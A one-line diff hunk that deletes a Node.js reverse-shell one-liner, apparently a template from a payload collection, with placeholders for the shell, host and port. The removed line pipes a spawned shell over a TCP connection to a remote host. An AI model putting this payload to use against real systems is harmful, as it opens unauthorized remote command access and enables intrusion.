@@ -1,1 +1,0 @@
-node -e 'shell = require("child_process").spawn("*\shell*"); require("net").connect(*\port*, "*\host*", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'
